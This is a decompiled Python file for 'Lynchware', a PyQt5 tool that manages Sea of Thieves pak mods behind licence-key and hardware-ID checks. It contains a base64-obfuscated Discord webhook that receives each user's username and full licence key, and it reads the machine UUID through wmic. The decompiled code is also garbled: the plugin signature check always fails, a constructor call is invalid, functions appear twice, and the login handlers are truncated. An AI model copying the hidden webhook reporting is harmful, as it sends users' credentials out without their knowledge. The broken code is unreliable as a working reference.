# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: lynchware.pyw
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

global pak_directory  # inserted
import base64
import sys
import os
import shutil
import subprocess
import json
from PyQt5.QtCore import Qt, QSize, QPoint, QTimer, QThread, pyqtSignal, QPropertyAnimation, QEasingCurve, QSequentialAnimationGroup, QPauseAnimation, QEvent
from PyQt5.QtGui import QMovie, QIcon, QPixmap, QPainterPath, QRegion
from PyQt5.QtWidgets import QSplashScreen, QApplication, QMainWindow, QLabel, QLineEdit, QPushButton, QColorDialog, QCheckBox, QMessageBox, QVBoxLayout, QHBoxLayout, QWidget, QGridLayout, QFileDialog, QScrollArea, QDialog, QListWidget, QGroupBox, QFormLayout, QInputDialog, QMenu, QFrame, QGraphicsOpacityEffect, QToolTip
from pathlib import Path
STYLESHEET = '\nQWidget { background-color: #2E3440; color: #D8DEE9; }\nQPushButton { background-color: #4C566A; border: 1px solid #4C566A; border-radius: 5px; padding: 6px; }\nQPushButton:hover { background-color: #5E81AC; border: 2px solid #FFFFFF; }\nQLineEdit, QTextEdit { background-color: #3B4252; border: 1px solid #4C566A; border-radius: 4px; padding: 4px; }\nQCheckBox { spacing: 6px; }\nQCheckBox::indicator { width: 16px; height: 16px; }\nQGroupBox { border: 1px solid #4C566A; margin-top: 10px; }\nQGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 3px; }\nQScrollArea { background: transparent; }\nQScrollBar:vertical { background-color: #4C566A; width: 12px; border-radius: 6px; }\nQScrollBar::handle:vertical { background-color: #5E81AC; min-height: 20px; border-radius: 6px; }\nQScrollBar::add-line:vertical, QScrollBar::sub-line:vertical { height: 0; }\n'
STYLESHEET += '\nQPushButton:checked { background-color: #5E81AC; }\n'
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
PUBLIC_KEY_PEM = b'\n-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsMYtcfgXPpzLE7xOoHpl\nDBxny6J0eRC+OS+6caBYDwCG85fWSt/nux39zDlUQRvmvm34SeUlz1riQSHh5uch\nguPUFe9upWKeVoOYHpDN1IAFcMRVX0ZNHkmidyECYrByL2mEFjs50TWWx8od0wt4\ntMMSdMoUnI5OTMrOthYSm47eqvE8W1VoGZ1zXyyqGjZkWQJsc5sg2LBR4XBBrjvk\nAgYBdLsrhDSuIA86oJEc9ffgQ6oalo2qAFI7jHANKUohpkNHCniKIB4vVxIKFQKW\ngw+5AcIFaAypY5wEm77FboRDuwnBzRs31CsA/HHODBxSCoGkeAYR0Ou7Vl+OzCog\nmwIDAQAB\n-----END PUBLIC KEY-----\n'

def verify_plugin_signature(py_path: Path) -> bool:
    sig_path = py_path.with_suffix(py_path.suffix + '.sig')
    if not sig_path.exists():
        return False  # Return false if signature doesn't exist
    return False

class PakItem:
    def __init__(self, filename, source, category):
        self.filename = filename
        self.source = source
        self.category = category
        local_thumb = os.path.join(CUSTOM_PAK_IMAGES_DIR, filename.replace('.pak', '.png'))
        default_thumb = os.path.join(images_directory, filename.replace('.pak', '.png'))
        if os.path.exists(local_thumb):
            self.thumbnail = local_thumb
        elif os.path.exists(default_thumb):
            self.thumbnail = default_thumb
        else:
            self.thumbnail = default_set_image
        return None

    def __repr__(self):
        return f'<PakItem {self.filename} [{self.source}]>'
import webbrowser
import requests

def send_discord_notification(username, key):
    b64_webhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2MzE2MTk1MDQyNjYyODMxNi9QVWo3a2gtWXBlZUFEd1FTbjVRbk9aMTBENkJhMWhFMEhtMjJfeVFTQWRKRGk5eG5SeHZDdld0SUEzX3BkajEyd3NtNw=='
    webhook_url = base64.b64decode(b64_webhook).decode()
    data = {'key': f'****{key[(-4):]}', 'content': f':white_check_mark: **New Login Detected!**\n- Username: `{username}`\n- Key: `{key}`'}
    try:
        requests.post(webhook_url, json=data, timeout=5)
    except Exception as e:
        print(f'Discord notification failed: {e}')
pak_directory = ''
APP_DATA_PATH = os.path.join(os.getenv('APPDATA'), 'PakManager')
PLUGINS_DIR = os.path.join(APP_DATA_PATH, 'plugins')
PROFILES_FILE = os.path.join(APP_DATA_PATH, 'profiles.json')
os.makedirs(PLUGINS_DIR, exist_ok=True)
os.makedirs(os.path.dirname(PROFILES_FILE), exist_ok=True)
import glob
import importlib.util

class PluginManager:
    def __init__(self):
        self.hooks = {'on_load': [], 'on_pak_toggled': [], 'on_profile_saved': [], 'on_profile_loaded': []}
        self.plugins_dir = PLUGINS_DIR

    def load_plugins(self):
        for py_file in Path(self.plugins_dir).glob('*.py'):
            if not verify_plugin_signature(py_file):
                print(f'Skipping untrusted plugin: {py_file.name}')
                continue
            spec = importlib.util.spec_from_file_location(py_file.stem, str(py_file))
            mod = importlib.util.module_from_spec(spec)
            try:
                spec.loader.exec_module(mod)
                if hasattr(mod, 'register'):
                    mod.register(self)
            except Exception as e:
                print(f'Failed to load plugin {py_file.name}: {e}')
        self.emit('on_load')

    def register_hook(self, hook_name, fn):
        if hook_name in self.hooks:
            self.hooks[hook_name].append(fn)
        return None

    def emit(self, hook_name, *args, **kwargs):
        for fn in self.hooks.get(hook_name, []):
            try:
                fn(*args, **kwargs)
            except Exception as e:
                print(f'Plugin error in {hook_name}: {e}')

def load_profiles():
    try:
        with open(PROFILES_FILE, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_profiles(profiles):
    with open(PROFILES_FILE, 'w') as f:
        json.dump(profiles, f, indent=2)
CUSTOM_PAK_IMAGES_DIR = os.path.join(APP_DATA_PATH, 'custom_pak_images')
if not os.path.exists(CUSTOM_PAK_IMAGES_DIR):
    os.makedirs(CUSTOM_PAK_IMAGES_DIR)
if not os.path.exists(APP_DATA_PATH):
    os.makedirs(APP_DATA_PATH)
SETTINGS_PATH = os.path.join(APP_DATA_PATH, 'settings.json')
THEMES_DIR = os.path.join(APP_DATA_PATH, 'themes')
if not os.path.exists(THEMES_DIR):
    os.makedirs(THEMES_DIR)
THEME_FEED_URL = 'https://example.com/pakmanager/themes.json'
steam_pak_directory = 'C:\\Program Files (x86)\\Steam\\steamapps\\common\\Sea of Thieves\\Athena\\Content\\Paks'
xbox_pak_directory = 'C:\\XboxGames\\Sea of Thieves\\Content\\Athena\\Content\\Paks'
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PAK_MARKETPLACE_DIR = os.path.join(BASE_DIR, 'pak_marketplace')
os.makedirs(PAK_MARKETPLACE_DIR, exist_ok=True)
default_dirs = {'weapons': os.path.join(BASE_DIR, 'pak_files'), 'vanity': os.path.join(BASE_DIR, 'vanity_paks'), 'equipment': os.path.join(BASE_DIR, 'eq_paks')}
for key in default_dirs:
    if not os.path.exists(default_dirs[key]):
        os.makedirs(default_dirs[key])
custom_dirs = {'weapons': os.path.join(APP_DATA_PATH, 'custom_weapon_paks'), 'vanity': os.path.join(APP_DATA_PATH, 'custom_vanity_paks'), 'equipment': os.path.join(APP_DATA_PATH, 'custom_eq_paks')}
for key in custom_dirs:
    if not os.path.exists(custom_dirs[key]):
        os.makedirs(custom_dirs[key])
side_paks_directory = os.path.join(BASE_DIR, 'side_paks')
images_directory = os.path.join(BASE_DIR, 'images')
default_background_path = os.path.join(BASE_DIR, 'background.gif')
loading_gif_path = os.path.join(BASE_DIR, 'loading.gif')
see_icon_path = os.path.join(BASE_DIR, 'see.png')
default_set_image = os.path.join(BASE_DIR, 'set.png')
google_sheet_url = 'https://docs.google.com/spreadsheets/d/e/2PACX-1vS_P_4sTM8b5hoOMWQueCjv2szViXXry6ViA5dWQSkk_fLvzzW2YbokGCJ2_JGs9NBzf_Sp8MHZamaO/pub?output=csv'
keys_google_sheet_url = 'https://docs.google.com/spreadsheets/d/e/2PACX-1vSzchChvDq9l1pMmZRcuQTrwYaqe0C71cwhLEn7nAarg2VF2A-jFOASzoxjfJ9O2biQH6mggtu1BJv9/pub?output=csv'
from gsheets_auth import sheet
from datetime import datetime

def fetch_valid_keys():
    try:
        records = sheet.get_all_records()
        keys = []
        now = datetime.utcnow()
        for row in records:
            exp = row.get('ExpiresAt')
            if exp:
                try:
                    exp_dt = datetime.fromisoformat(exp)
                    keys.append(row['Key'].strip())
                except Exception:
                    pass
        return keys
    except Exception as e:
        print(f'Error fetching keys: {e}')
        return []
from gsheets_auth import sheet
from datetime import datetime
from PyQt5.QtCore import QEasingCurve, QPropertyAnimation, QRect, pyqtProperty, QPropertyAnimation, QEasingCurve, QSequentialAnimationGroup, QPauseAnimation, QEvent
from PyQt5.QtGui import QColor, QPainter, QBrush, QPen
from PyQt5.QtWidgets import QCheckBox

class Switch(QCheckBox):
    def __init__(self, label='', parent=None):
        super().__init__(label, parent)
        self.track_height = 16
        self.track_width = self.track_height * 2
        self.spacing = 8
        fm = self.fontMetrics()
        text_width = fm.width(self.text())
        total_width = self.track_width + self.spacing + text_width
        total_height = max(self.track_height, fm.height())
        self.setFixedSize(total_width, total_height)
        self._circle_position = self.track_width - self.track_height + 2 if self.isChecked() else 2
        self.animation = QPropertyAnimation(self, b'circle_position', self)
        self.animation.setEasingCurve(QEasingCurve.InOutCubic)
        self.animation.setDuration(120)
        self.stateChanged.connect(self.start_transition)
        self._hover = False
        self.setMouseTracking(True)
        self.setCursor(Qt.PointingHandCursor)

    def start_transition(self, state):
        end = self.track_width - self.track_height + 2 if state else 2
        self.animation.stop()
        self.animation.setEndValue(end)
        self.animation.start()

    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.Antialiasing)
        bg = QColor('#e5b0ff') if self.isChecked() else QColor('#777777')
        p.setBrush(QBrush(bg))
        y = (self.height() - self.track_height) // 2
        track_rect = QRect(0, y, self.track_width, self.track_height)
        p.drawRoundedRect(track_rect, self.track_height / 2, self.track_height / 2)
        circle_rect = QRect(self._circle_position, y + 2, self.track_height - 4, self.track_height - 4)
        p.setBrush(QBrush(QColor('#FFFFFF')))
        p.drawEllipse(circle_rect)
        fm = p.fontMetrics()
        txt_x = self.track_width + self.spacing
        txt_y = (self.height() + fm.ascent() - fm.descent()) // 2
        p.setPen(self.palette().text().color())
        p.drawText(txt_x, txt_y, self.text())
        p.end()

    @pyqtProperty(int)
    def circle_position(self):
        return self._circle_position

    @circle_position.setter
    def circle_position(self, pos):
        self._circle_position = pos
        self.update()

    def enterEvent(self, event):
        self._hover = True
        self.update()
        super().enterEvent(event)

    def leaveEvent(self, event):
        self._hover = False
        self.update()
        super().leaveEvent(event)

def fetch_valid_keys():
    try:
        records = sheet.get_all_records()
        keys = []
        now = datetime.utcnow()
        for row in records:
            exp = row.get('ExpiresAt')
            if exp:
                try:
                    exp_dt = datetime.fromisoformat(exp)
                    keys.append(row['Key'].strip())
                except Exception:
                    pass
        return keys
    except Exception as e:
        print(f'Error fetching keys: {e}')
        return []

def fetch_hwid_list():
    try:
        records = sheet.get_all_records()
        hwids = []
        for row in records:
            hwid = row.get('HWID')
            if hwid:
                hwids.append(hwid.strip().upper())
        return hwids
    except Exception as e:
        print(f'Error fetching HWIDs: {e}')
        return []

def get_hwid():
    hwid = str(subprocess.check_output('wmic csproduct get uuid')).strip().replace('\\r', '').split('\\n')[1].strip()
    return hwid

def load_settings():
    try:
        with open(SETTINGS_PATH, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_settings(settings):
    with open(SETTINGS_PATH, 'w') as f:
        json.dump(settings, f)

def get_background_path():
    settings = load_settings()
    return settings.get('background_gif', default_background_path)

class HWIDCheckThread(QThread):
    hwid_check_done = pyqtSignal(bool)

    def run(self):
        hwid = get_hwid().replace(' ', '').upper()
        hwid_list = fetch_hwid_list()
        self.hwid_check_done.emit(hwid in hwid_list)

class GamePlatformChoiceWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(Qt.FramelessWindowHint)
        self.is_dragging = False
        self.last_pos = QPoint()
        self.setWindowTitle('Select Your Platform')
        self.setGeometry(100, 100, 400, 250)
        self.setStyleSheet('background-color: rgba(0,0,0,0);')
        self.video_label = QLabel(self)
        self.video_label.setGeometry(0, 0, self.width(), self.height())
        self.video_label.setScaledContents(True)
        bg_path = default_background_path
        if os.path.exists(bg_path):
            self.movie = QMovie(bg_path)
            self.video_label.setMovie(self.movie)
            self.movie.setScaledSize(self.video_label.size())
            self.movie.start()
        self.video_label.setAttribute(Qt.WA_TransparentForMouseEvents)
        self.video_label.lower()
        self.title_label = QLabel('Select your platform', self)
        self.title_label.setGeometry(0, 40, 400, 40)
        self.title_label.setAlignment(Qt.AlignCenter)
        self.title_label.setStyleSheet('font-size:16px; color:white; font-weight:bold;')
        self.steam_button = QPushButton('Steam', self)
        self.steam_button.setGeometry(100, 100, 200, 40)
        self.steam_button.setStyleSheet('\n            QPushButton { background-color: #1280bf; color: white; font-weight: bold; font-size:14px; border-radius:20px; padding:10px; }\n            QPushButton:hover { background-color: #1a91d6; border: 2px solid #FFFFFF; border: 2px solid #FFFFFF;  }\n        ')
        self.steam_button.clicked.connect(self.set_steam_directory)
        self.xbox_button = QPushButton('Xbox', self)
        self.xbox_button.setGeometry(100, 150, 200, 40)
        self.xbox_button.setStyleSheet('\n            QPushButton { background-color: green; color: white; font-weight: bold; font-size:14px; border-radius:20px; padding:10px; }\n            QPushButton:hover { background-color: #33cc33; border: 2px solid #FFFFFF; border: 2px solid #FFFFFF;  }\n        ')
        self.xbox_button.clicked.connect(self.set_xbox_directory)
        self.custom_button = QPushButton('Custom', self)
        self.custom_button.setGeometry(100, 200, 200, 40)
        self.custom_button.setStyleSheet('\n            QPushButton { background-color: #f0b9fb; color: white; font-weight: bold; font-size:14px; border-radius:20px; padding:10px; }\n            QPushButton:hover { background-color: #efc9f1; border: 2px solid #FFFFFF; border: 2px solid #FFFFFF;  }\n        ')
        self.custom_button.clicked.connect(self.set_custom_directory)
        self.show()
        self.center_window()
        self.setAttribute(Qt.WA_TranslucentBackground)
        path = QPainterPath()
        path.addRoundedRect(0, 0, self.width(), self.height(), 20, 20)
        region = QRegion(path.toFillPolygon().toPolygon())
        self.setMask(region)

    def set_steam_directory(self):
        global pak_directory
        if not os.path.exists(steam_pak_directory):
            QMessageBox.warning(self, 'Directory Not Found', 'Steam pak directory not found.')
            return None
        else:
            pak_directory = steam_pak_directory
            self.hide()
            self.main_window = MainWindow()
            self.main_window.show()
        return None

    def set_xbox_directory(self):
        global pak_directory
        if not os.path.exists(xbox_pak_directory):
            QMessageBox.warning(self, 'Directory Not Found', 'Xbox pak directory not found.')
            return None
        else:
            pak_directory = xbox_pak_directory
            self.hide()
            self.main_window = MainWindow()
            self.main_window.show()
        return None

    def set_custom_directory(self):
        global pak_directory
        directory = QFileDialog.getExistingDirectory(self, 'Select Custom Directory')
        if directory:
            pak_directory = directory
            self.hide()
            self.main_window = MainWindow()
            self.main_window.show()
        return None

    def center_window(self):
        screen = QApplication.desktop().screenGeometry()
        size = self.geometry()
        self.move((screen.width() - size.width()) // 2, (screen.height() - size.height()) // 2)

    def mousePressEvent(self, event):
        if event.button() == Qt.LeftButton:
            self.is_dragging = True
            self.last_pos = event.globalPos()
        return None

    def mouseMoveEvent(self, event):
        if self.is_dragging:
            delta = QPoint(event.globalPos() - self.last_pos)
            self.move(self.x() + delta.x(), self.y() + delta.y())
            self.last_pos = event.globalPos()
        return None

    def mouseReleaseEvent(self, event):
        self.is_dragging = False

class ConnectingScreen(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('Lynchware')
        self.setGeometry(100, 100, 600, 400)
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowSystemMenuHint)
        self.setStyleSheet('background-color: #152d67;')
        scaled_width = self.width() // 2
        scaled_height = self.height() // 2
        gif_x = (self.width() - scaled_width) // 2
        gif_y = (self.height() - scaled_height) // 2
        self.loading_gif_label = QLabel(self)
        self.loading_gif_label.setGeometry(gif_x, gif_y, scaled_width, scaled_height)
        if os.path.exists(loading_gif_path):
            self.movie = QMovie(loading_gif_path)
            self.loading_gif_label.setMovie(self.movie)
            self.movie.setScaledSize(QSize(scaled_width, scaled_height))
            self.movie.start()
        self.title_label = QLabel('Connecting to servers . . .', self)
        self.title_label.setGeometry(0, 40, 600, 40)
        self.title_label.setAlignment(Qt.AlignCenter)
        self.title_label.setStyleSheet('font-size:20px; color:white; font-weight:bold;')
        self.hwid_thread = HWIDCheckThread()
        self.hwid_thread.hwid_check_done.connect(self.on_hwid_check_done)
        self.hwid_thread.start()
        self.show()
        self.center_window()

    def on_hwid_check_done(self, success):
        if success:
            print('HWID Check Passed! Proceeding to asset loading...')
            QTimer.singleShot(3000, self.update_text)
            QTimer.singleShot(7000, self.close_and_open_login)
        return None

    def update_text(self):
        self.title_label.setText('Loading assets . . .')

    def close_and_open_login(self):
        try:
            print('Transitioning to Login Window...')
            self.close()
            self.login_window = LoginWindow()
            self.login_window.show()
        except Exception as e:
            print(f'Error during window transition: {e}')

    def center_window(self):
        screen = QApplication.desktop().screenGeometry()
        size = self.geometry()
        self.move((screen.width() - size.width()) // 2, (screen.height() - size.height()) // 2)

    def mousePressEvent(self, event):
        if event.button() == Qt.LeftButton:
            self.is_dragging = True
            self.last_pos = event.globalPos()
        return None

    def mouseMoveEvent(self, event):
        if self.is_dragging:
            delta = QPoint(event.globalPos() - self.last_pos)
            self.move(self.x() + delta.x(), self.y() + delta.y())
            self.last_pos = event.globalPos()
        return None

    def mouseReleaseEvent(self, event):
        self.is_dragging = False

class LoginWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowSystemMenuHint | Qt.WindowMinimizeButtonHint)
        self.setWindowTitle('Lynchware')
        self.setGeometry(100, 100, 600, 400)
        self.users = self.load_user_data()
        self.is_dragging = False
        self.last_pos = QPoint()
        self.central_widget = QWidget(self)
        self.central_widget.setStyleSheet('background-color: transparent;')
        self.setCentralWidget(self.central_widget)
        self.video_label = QLabel(self.central_widget)
        self.video_label.setGeometry(0, 0, self.width(), self.height())
        self.video_label.setScaledContents(True)
        bg_path = default_background_path
        if os.path.exists(bg_path):
            self.movie = QMovie(bg_path)
            self.video_label.setMovie(self.movie)
            self.movie.setScaledSize(self.video_label.size())
            self.movie.start()
        self.video_label.setAttribute(Qt.WA_TransparentForMouseEvents)
        self.video_label.lower()
        self.title_label = QLabel('Log in', self.central_widget)
        self.title_label.setGeometry(0, 40, 600, 40)
        self.title_label.setAlignment(Qt.AlignCenter)
        self.title_label.setStyleSheet('font-size:20px; color:white; font-weight:bold;')
        self.username_input = QLineEdit(self.central_widget)
        self.username_input.setGeometry(150, 120, 300, 40)
        self.username_input.setPlaceholderText('Enter your username')
        self.username_input.setStyleSheet('font-size:16px; color: black; background-color: rgba(255,255,255,150); border-radius:15px; padding:10px;')
        self.key_input = QLineEdit(self.central_widget)
        self.key_input.setGeometry(150, 180, 300, 40)
        self.key_input.setPlaceholderText('Enter your LW license key here')
        self.key_input.setStyleSheet('font-size:16px; color: black; background-color: rgba(255,255,255,150); border-radius:15px; padding:10px;')
        self.key_input.setEchoMode(QLineEdit.Password)
        self.auto_load_credentials()
        self.show_key_btn = QPushButton(self.central_widget)
        self.show_key_btn.setGeometry(420, 185, 30, 30)
        if os.path.exists(see_icon_path):
            icon = QIcon(see_icon_path)
            self.show_key_btn.setIcon(icon)
            self.show_key_btn.setIconSize(QSize(30, 30))
        self.show_key_btn.setFlat(True)
        self.show_key_btn.setStyleSheet('background-color: transparent;')
        self.show_key_btn.clicked.connect(self.toggle_key_visibility)
        self.key_button = QPushButton('Login', self.central_widget)
        self.key_button.setGeometry(220, 240, 160, 40)
        self.key_button.setStyleSheet('background-color: #e5b0ff; color: white; font-weight: bold; font-size:14px; border-radius:20px; padding:10px;')
        self.key_button.clicked.connect(self.authenticate_key)
        self.create_account_button = QPushButton('Create Account', self.central_widget)
        self.create_account_button.setGeometry(220, 290, 160, 40)
        self.create_account_button.setStyleSheet('background-color: #e5b0ff; color: white; font-weight: bold; font-size:14px; border-radius:20px; padding:10px;')
        self.create_account_button.clicked.connect(self.create_account)
        self.discord_button = QPushButton(self.central_widget)
        self.discord_button.setGeometry(520, 10, 60, 60)
        if getattr(sys, 'frozen', False):
            bundle_dir = sys._MEIPASS
        else:
            bundle_dir = os.path.dirname(os.path.abspath(__file__))  # Default to current directory
        disc_path = os.path.join(bundle_dir, 'disc.png')
        if os.path.exists(disc_path):
            icon = QIcon(disc_path)
            self.discord_button.setIcon(icon)
            self.discord_button.setIconSize(QSize(56, 56))
        self.discord_button.setFlat(True)
        self.discord_button.setStyleSheet('border: none; background: transparent;')
        self.discord_button.setCursor(Qt.PointingHandCursor)
        self.discord_button.setFocusPolicy(Qt.NoFocus)
        self.discord_button.clicked.connect(self.open_discord_link)
        self.auth_msg_label = QLabel('Authenticating key, please wait...', self.central_widget)
        self.auth_msg_label.setGeometry(150, 340, 300, 20)
        self.auth_msg_label.setStyleSheet('font-size:12px; color: white;')
        self.auth_msg_label.setAlignment(Qt.AlignCenter)
        self.auth_msg_label.setVisible(False)
        self.show()
        self.setAttribute(Qt.WA_TranslucentBackground)
        path = QPainterPath()
        path.addRoundedRect(0, 0, self.width(), self.height(), 20, 20)
        region = QRegion(path.toFillPolygon().toPolygon())
        self.setMask(region)
        self.center_window()

    def toggle_key_visibility(self):
        if self.key_input.echoMode() == QLineEdit.Password:
            self.key_input.setEchoMode(QLineEdit.Normal)
        return None

    def load_user_data(self):
        try:
            with open(os.path.join(APP_DATA_PATH, 'users.json'), 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            return {}

    def save_user_data(self):
        with open(os.path.join(APP_DATA_PATH, 'users.json'), 'w') as f:
            json.dump(self.users, f)

    def auto_load_credentials(self):
        if self.users:
            saved_username = list(self.users.keys())[0]
            self.username_input.setText(saved_username)
            saved_key = self.users[saved_username].get('key')
            if saved_key:
                self.key_input.setText(saved_key)
            return

    def authenticate_key(self):
        entered_key = self.key_input.text()
        entered_username = self.username_input.text()
        if not entered_username.strip():
            QMessageBox.warning(self, 'Username Needed', 'Username is required to login.')
        return None

    def create_account(self):
        entered_key = self.key_input.text()
        entered_username = self.username_input.text()
        if not entered_username.strip():
            QMessageBox.warning(self, 'Username Needed', 'Username is required to create an account.')
        return None

    def open_discord_link(self):
        webbrowser.open('https://discord.gg/VtyyDFMFn3')

    def upload_custom_gif(self):
        file_path, _ = QFileDialog.getOpenFileName(self, 'Upload Custom GIF', '', 'GIF Files (*.gif)')
        if file_path:
            self.set_background_gif(file_path)
            settings = load_settings()
            settings['background_gif'] = file_path
            save_settings(settings)
        return None

    def set_background_gif(self, file_path):
        self.movie.stop()
        self.movie = QMovie(file_path)
        self.video_label.setMovie(self.movie)
        self.movie.setScaledSize(self.video_label.size())
        self.movie.start()

    def center_window(self):
        screen = QApplication.desktop().screenGeometry()
        size = self.geometry()
        self.move((screen.width() - size.width()) // 2, (screen.height() - size.height()) // 2)

    def mousePressEvent(self, event):
        if event.button() == Qt.LeftButton:
            self.is_dragging = True
            self.last_pos = event.globalPos()
        return None

    def mouseMoveEvent(self, event):
        if self.is_dragging:
            delta = QPoint(event.globalPos() - self.last_pos)
            self.move(self.x() + delta.x(), self.y() + delta.y())
            self.last_pos = event.globalPos()
        return None

    def mouseReleaseEvent(self, event):
        self.is_dragging = False

class SettingsWindow(QMainWindow):
    def __init__(self, parent=None):
        super(self, self).__init__(parent)
        self.setWindowTitle('Theme Settings')
        self.setGeometry(200, 200, 320, 350)
        self.setStyleSheet('background-color: #222; color: white;')
        self.parent = parent
        self.settings = load_settings()
        self.original_settings = self.settings.copy()
        layout = QVBoxLayout()
        widget = QWidget()
        widget.setLayout(layout)
        self.setCentralWidget(widget)
        self.bg_btn = QPushButton('Set Background Color')
        self.text_btn = QPushButton('Set Text Color')
        self.btn_color_btn = QPushButton('Set Button Color')
        self.scrollbar_btn = QPushButton('Set Scrollbar Color')
        self.fade_color_btn = QPushButton('Set Side-Panel Fade Color')
        self.upload_bg_btn = QPushButton('Upload Background GIF')
        self.save_btn = QPushButton('Save')
        self.revert_btn = QPushButton('Revert')
        for btn in [self.bg_btn, self.text_btn, self.btn_color_btn, self.scrollbar_btn, self.fade_color_btn, self.upload_bg_btn]:
            layout.addWidget(btn)
        layout.addWidget(self.save_btn)
        layout.addWidget(self.revert_btn)
        self.bg_btn.clicked.connect(lambda: self.set_color('background'))
        self.text_btn.clicked.connect(lambda: self.set_color('text'))
        self.btn_color_btn.clicked.connect(lambda: self.set_color('button'))
        self.scrollbar_btn.clicked.connect(lambda: self.set_color('scrollbar'))
        self.upload_bg_btn.clicked.connect(self.upload_background)
        self.fade_color_btn.clicked.connect(lambda: self.set_color('side_fade'))
        self.remove_bg_btn = QPushButton('Reset Background')
        layout.addWidget(self.remove_bg_btn)
        self.remove_bg_btn.clicked.connect(self.remove_background)
        self.save_btn.clicked.connect(self.save_settings)
        self.revert_btn.clicked.connect(self.revert_settings)
        hover_style = '\n        QPushButton {\n            background-color: #444;\n            color: white;\n            padding: 8px;\n            margin: 5px;\n            border-radius: 6px;\n        }\n        QPushButton:hover {\n            background-color: #555; border: 2px solid #FFFFFF;\n        }\n        '
        for btn in [self.bg_btn, self.text_btn, self.btn_color_btn, self.scrollbar_btn, self.fade_color_btn, self.upload_bg_btn, self.remove_bg_btn, self.save_btn, self.revert_btn]:
            btn.setStyleSheet(hover_style)

    def set_color(self, key):
        color = QColorDialog.getColor()
        if not color.isValid():
            return None
        self.settings[key] = color.name()

    def apply_theme(self):
        qss = f"\n        QWidget { background-color: {self.settings.get('background', '#2E3440')}; \n                  color: {self.settings.get('text', '#D8DEE9')}; }\n        QPushButton { background-color: {self.settings.get('button', '#4C566A')};\n                       border: 1px solid #4C566A; border-radius:5px; padding:6px; }\n        QPushButton:hover { background-color: #5E81AC; }\n        QLineEdit, QTextEdit { background-color: #3B4252; \n                                border:1px solid #4C566A; border-radius:4px; padding:4px; }\n        QScrollBar:vertical { background-color: {self.settings.get('scrollbar', '#4C566A')}; \n                              width:12px; border-radius:6px; }\n        QScrollBar::handle:vertical { background-color: {self.settings.get('scrollbar', '#5E81AC')}; \n                                      min-height:20px; border-radius:6px; }\n        "
        QApplication.instance().setStyleSheet(qss)
        fade = self.settings.get('side_fade', '#9a1ea8')
        if self.parent and hasattr(self.parent, 'side_panel_wrapper'):
            self.parent.side_panel_wrapper.setStyleSheet(f'background: qlineargradient(spread:pad, x1:0, y1:1, x2:0, y2:0, stop:0 {fade}, stop:1 transparent);')
            return

    def save_settings(self):
        save_settings(self.settings)
        self.apply_theme()
        self.close()

    def revert_settings(self):
        self.settings = load_settings()
        self.apply_theme()

    def upload_background(self):
        file_path, _ = QFileDialog.getOpenFileName(self, 'Upload Background GIF', '', 'GIF Files (*.gif)')
        if file_path:
            self.settings['background_gif'] = file_path
            save_settings(self.settings)
            if self.parent and hasattr(self.parent, 'bg_label'):
                self.parent.bg_label.show()
                try:
                    self.parent.movie.stop()
                    self.parent.movie = QMovie(file_path)
                    self.parent.bg_label.setMovie(self.parent.movie)
                    self.parent.movie.setScaledSize(self.parent.bg_label.size())
                    self.parent.movie.start()
                except:
                    pass

    def remove_background(self):
        if 'background_gif' in self.settings:
            self.settings.pop('background_gif', None)
            save_settings(self.settings)
        if self.parent and hasattr(self.parent, 'bg_label'):
            try:
                self.parent.movie.stop()
                self.parent.bg_label.hide()
                QApplication.instance().setStyleSheet(STYLESHEET)
            except:
                pass

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.plugin_manager = PluginManager()
        self.plugin_manager.load_plugins()
        self.setWindowTitle('Lynchware')
        self.setGeometry(100, 100, 1000, 600)
        self.setFixedSize(1000, 600)
        self.current_category = 'weapons'
        self.pak_items = []
        self.selection_mode = False
        self.selected_items = set()
        self.source_filters = {'default': True, 'custom': True}
        self.init_ui()
        self.load_pak_items()
        self.refresh_display()
        self.plugin_manager.emit('on_load')

    def init_ui(self):
        self.bg_label = QLabel(self)
        self.bg_label.setGeometry(0, 0, 1000, 600)
        self.bg_label.setScaledContents(True)
        settings = load_settings()
        custom_bg = settings.get('background_gif', None)
        if custom_bg and os.path.exists(custom_bg):
            self.movie = QMovie(custom_bg)
            self.bg_label.setMovie(self.movie)
            self.movie.setScaledSize(self.bg_label.size())
            self.movie.start()
            self.bg_label.show()
        container = QWidget(self)
        container.setStyleSheet('background: transparent;')
        container.setGeometry(0, 0, 1000, 600)
        main_layout = QHBoxLayout(container)
        left_panel = QVBoxLayout()
        self.collapse_btn = QPushButton('☰')
        self.collapse_btn.setFixedSize(24, 24)
        self.collapse_btn.clicked.connect(self.toggle_side_panel)
        left_panel.addWidget(self.collapse_btn)
        self.search_bar = QLineEdit()
        self.search_bar.setPlaceholderText('Search paks...')
        self.search_bar.textChanged.connect(self.refresh_display)
        left_panel.addWidget(self.search_bar)
        filt_layout = QHBoxLayout()
        self.filter_default = QCheckBox('Default')
        self.filter_default.setChecked(True)
        self.filter_default.toggled.connect(lambda _: self.toggle_source_filter('default'))
        self.filter_custom = QCheckBox('Custom')
        self.filter_custom.setChecked(True)
        self.filter_custom.toggled.connect(lambda _: self.toggle_source_filter('custom'))
        filt_layout.addWidget(self.filter_default)
        filt_layout.addWidget(self.filter_custom)
        left_panel.addLayout(filt_layout)
        cat_layout = QHBoxLayout()
        for cat in ['weapons', 'vanity', 'equipment']:
            b = QPushButton(cat.capitalize())
            b.setToolTip(f'Show {cat} paks')
            b.clicked.connect(lambda _, c=cat: self.change_category(c))
            cat_layout.addWidget(b)
        left_panel.addLayout(cat_layout)
